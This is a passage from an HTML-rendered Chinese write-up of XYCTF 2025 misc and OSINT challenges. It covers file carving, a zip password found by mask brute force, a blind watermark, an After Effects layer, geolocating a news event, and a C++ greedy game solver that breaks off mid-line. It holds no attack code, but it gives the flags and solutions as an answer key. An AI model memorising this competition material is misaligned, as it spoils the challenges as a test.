class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]<span class=\"token operator\">></span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span>[<span class=\"token operator\">&lt;</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">+</span><span class=\"token operator\">></span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span>]<span class=\"token operator\">&lt;</span>.[<span class=\"token operator\">-</span>]</code></pre>\n\n<p>flag{W3lC0me_t0_XYCTF_2025_Enj07_1t!}</p>\n<h3 id=\"曼波曼波曼波\"><a href=\"#曼波曼波曼波\" class=\"headerlink\" title=\"曼波曼波曼波\"></a>曼波曼波曼波</h3><p>smn.txt的base64逆序，后发现jpg文件头，保存为文件</p>\n<p><img src=\"/images/download-1744626745339-68.jpg\">\t\t\t\t\t\t\t\t\t\t\t\t\t\t</p>\n<p>010查看发现后面跟了PK，binwalk分解得到压缩包</p>\n<p>提示说，密码是什么来着，有点记不清了，呜呜呜呜 好像是什么比赛名字加年份</p>\n<p>还以为有什么其他的，掩码爆破了一下发现密码确实是XYCTF2025</p>\n<p>给了两张一样的图片，双图盲水印秒了</p>\n<p><img src=\"/images/EASY_1_decpy3-1744626745339-69.png\"></p>\n<h3 id=\"MADer也要当CTFer\"><a href=\"#MADer也要当CTFer\" class=\"headerlink\" title=\"MADer也要当CTFer\"></a>MADer也要当CTFer</h3><p>提取mkv文件的字幕轨subs.ass</p>\n<p>发现是一堆hex提取出一个RIFX开头的文件，发现是一个aep文件</p>\n<p>使用ae打开，发现有图层</p>\n<p><img src=\"/images/1743836629066-03a76683-7499-468d-85f3-3fb10439a989-1744626745339-70.png\"></p>\n<p>取消设置隐藏”消隐”的图层，可以看到有一写文字，flag在flag2这个文本中，需要调一下缩放就可以复制其中的内容了。</p>\n<p><img src=\"/images/1743836639502-b7bffbac-436b-46f2-befe-b8721af93a21-1744626745339-72.png\"></p>\n<p>flag{l_re@IIy_w@nn@_2_Ie@rn_AE}</p>\n<h3 id=\"会飞的雷克萨斯\"><a href=\"#会飞的雷克萨斯\" class=\"headerlink\" title=\"会飞的雷克萨斯\"></a>会飞的雷克萨斯</h3><p>看图猜到是之前小孩炸车事件，直接百度该事件。</p>\n<p><img src=\"/images/QQ_1743832187198-1744626745339-71.png\"></p>\n<p>得到地址：四川省内江市资中县春岚北路</p>\n<p>后面XXXXXX内通过地图看应该是中铁城市中心</p>\n<p><img src=\"/images/QQ_1743832241003-1744626745339-73.png\"></p>\n<p>flag{四川省内江市资中县春岚北路中铁城市中心内}</p>\n<h3 id=\"XGCTF\"><a href=\"#XGCTF\" class=\"headerlink\" title=\"XGCTF\"></a>XGCTF</h3><p>搜索关键词找到题目名称：<strong>easy_polluted</strong></p>\n<p><img src=\"/images/QQ_1743832317067-1744626745339-74.png\"></p>\n<p><img src=\"/images/1743832324744-64f7289f-3287-4b94-996f-1b63731e7717-1744626745335-1.png\"></p>\n<p>github可以搜到dragonkeep</p>\n<p>通过访问他的.github.io会重定位到</p>\n<p><img src=\"/images/QQ_1743832409731-1744626745339-76.png\"></p>\n<p>找到第一篇文章。</p>\n<p><img src=\"/images/QQ_1743832453654-1744626745339-75.png\"></p>\n<p>f12找到flag进行base64解密。</p>\n<p><img src=\"/images/QQ_1743832482740-1744626745339-77.png\">flag{1t_I3_t3E_s@Me_ChAl1eNge_aT_a1L_P1e@se_fOrg1ve_Me}</p>\n<h3 id=\"Greedymen\"><a href=\"#Greedymen\" class=\"headerlink\" title=\"Greedymen\"></a>Greedymen</h3><p>将题目和思路发给claude写出计算优解代码</p>\n<p>思路：先拿最大质数；从其他质数相关的大合数开始取；给对面拿最少分数前提取剩下的数字</p>\n<p>算法代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;vector></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;set></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;algorithm></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;map></span></span>\n\n<span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> std<span class=\"token punctuation\">;</span>\n\nvector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token function\">getFactors</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> factors<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">%</span> i <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            factors<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> factors<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">bool</span> <span class=\"token function\">isPrime</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">*</span> i <span class=\"token operator\">&lt;=</span> n<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>n <span class=\"token operator\">%</span> i <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">struct</span> <span class=\"token class-name\">Evaluation</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">int</span> immediateGain<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> futureImpact<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> numFactors<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">bool</span> <span class=\"token keyword\">operator</span><span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> Evaluation <span class=\"token operator\">&amp;</span>other<span class=\"token punctuation\">)</span> <span class=\"token keyword\">const</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>immediateGain <span class=\"token operator\">!=</span> other<span class=\"token punctuation\">.</span>immediateGain<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> immediateGain <span class=\"token operator\">&lt;</span> other<span class=\"token punctuation\">.</span>immediateGain<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>futureImpact <span class=\"token operator\">!=</span> other<span class=\"token punctuation\">.</span>futureImpact<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> futureImpact <span class=\"token operator\">&lt;</span> other<span class=\"token punctuation\">.</span>futureImpact<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> numFactors <span class=\"token operator\">></span> other<span class=\"token punctuation\">.</span>numFactors<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> <span class=\"token keyword\">int</span> NEG_INF <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1000000000</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 使用整数常量</span>\n\nEvaluation <span class=\"token function\">evaluateChoice</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> num<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> <span class=\"token operator\">&amp;</span>usedNumbers<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> maxNum<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> factors <span class=\"token operator\">=</span> <span class=\"token function\">getFactors</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> opponentGain <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> newUsed <span class=\"token operator\">=</span> usedNumbers<span class=\"token punctuation\">;</span>\n    newUsed<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> factor <span class=\"token operator\">:</span> factors<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>factor <span class=\"token operator\">!=</span> num <span class=\"token operator\">&amp;&amp;</span> usedNumbers<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> usedNumbers<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            opponentGain <span class=\"token operator\">+=</span> factor<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">int</span> futureOptions <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> maxNum<span class=\"token punctuation\">;</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>newUsed<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> newUsed<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> iFactors <span class=\"token operator\">=</span> <span class=\"token function\">getFactors</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">bool</span> hasUnusedFactor <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> f <span class=\"token operator\">:</span> iFactors<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>f <span class=\"token operator\">!=</span> i <span class=\"token operator\">&amp;&amp;</span> newUsed<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> newUsed<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                    hasUnusedFactor <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>hasUnusedFactor<span class=\"token punctuation\">)</span>\n                futureOptions<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">&#123;</span>num <span class=\"token operator\">-</span> opponentGain<span class=\"token punctuation\">,</span> futureOptions<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>factors<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">solveLevel</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> maxNum<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> moves<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    set<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> used<span class=\"token punctuation\">;</span>\n    vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">></span> choices<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> myScore <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> opponentScore <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    map<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">,</span> vector<span class=\"token operator\">&lt;</span><span class=\"token keyword\">int</span><span class=\"token operator\">>></span> factorMap<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// 预计算所有数的因数</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> maxNum<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        factorMap<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">getFactors</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>moves <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">int</span> bestNum <span class=\"token operator\">=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        Evaluation bestEval <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>NEG_INF<span class=\"token punctuation\">,</span> NEG_INF<span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 使用整数常量</span>\n\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> maxNum<span class=\"token punctuation\">;</span> i <span class=\"token operator\">>=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>used<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">bool</span> hasUnusedFactor <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> factor <span class=\"token operator\">:</span> factorMap<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>factor <span class=\"token operator\">!=</span> i <span class=\"token operator\">&amp;&amp;</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                    hasUnusedFactor <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>hasUnusedFactor<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n\n            Evaluation eval <span class=\"token operator\">=</span> <span class=\"token function\">evaluateChoice</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> used<span class=\"token punctuation\">,</span> maxNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bestEval <span class=\"token operator\">&lt;</span> eval<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                bestEval <span class=\"token operator\">=</span> eval<span class=\"token punctuation\">;</span>\n                bestNum <span class=\"token operator\">=</span> i<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>bestNum <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n\n        choices<span class=\"token punctuation\">.</span><span class=\"token function\">push_back</span><span class=\"token punctuation\">(</span>bestNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        myScore <span class=\"token operator\">+=</span> bestNum<span class=\"token punctuation\">;</span>\n        used<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>bestNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> factor <span class=\"token operator\">:</span> factorMap<span class=\"token punctuation\">[</span>bestNum<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>factor <span class=\"token operator\">!=</span> bestNum <span class=\"token operator\">&amp;&amp;</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#123;</span>\n                opponentScore <span class=\"token operator\">+=</span> factor<span class=\"token punctuation\">;</span>\n                used<span class=\"token punctuation\">.</span><span class=\"token function\">insert</span><span class=\"token punctuation\">(</span>factor<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        moves<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 计算剩余数字</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> maxNum<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>used<span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> used<span class=\"token punctuation\">.</span><span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#123;</span>\n            opponentScore <span class=\"token operator\">+=</span> i<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Level \"</span> <span class=\"token operator\">&lt;&lt;</span> maxNum <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\" (\"</span> <span class=\"token operator\">&lt;&lt;</span> moves <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\" moves):\\n\"</span><span class=\"token punctuation\">;</span>\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"choices = [\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>size_t i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> choices<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        cout <span class=\"token operator\">&lt;&lt;</span> choices<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;</span> choices<span class=\"token punctuation\">.</span><span class=\"token function\">size</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n            cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\", \"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"]\\n\"</span><span class=\"token punctuation\">;</span>\n\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"My Score: \"</span> <span class=\"token operator\">&lt;&lt;</span> myScore <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n    cout <span class=\"token operator\">&lt;&lt;</span> <span class=\"token string\">\"Opponent Score: \"</span> <span class=\"token operator\">&lt;&lt;</span> opponentScore <span class=\"token operator\">&lt;&lt;</span> <span class=\"token 